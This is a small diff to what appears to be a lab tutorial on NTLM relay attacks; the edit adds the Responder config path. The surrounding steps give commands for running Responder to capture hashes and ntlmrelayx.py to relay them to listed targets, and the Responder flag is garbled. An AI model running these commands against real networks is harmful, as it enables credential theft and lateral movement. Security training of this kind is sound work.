@@ -16,7 +16,7 @@ Instead of cracking hashes gathered with Responder, we can instead relay those h
 
 >Note: In this case Vegeta is admin on both the Planet Vegeta Machine and Earth Machine
 
-1. Edit the responder configuration file ```gedit Responder.conf```
+1. Edit the responder configuration file in /etc/responder ```gedit Responder.conf```
 ![](https://i.imgur.com/zMDNVcs.png)
 2. Run Responder ```python Responder.py -| tun0 -dw```
 3. Set up the relay ```python ntlmrelayx.py -tf targets.txt -smb2support```
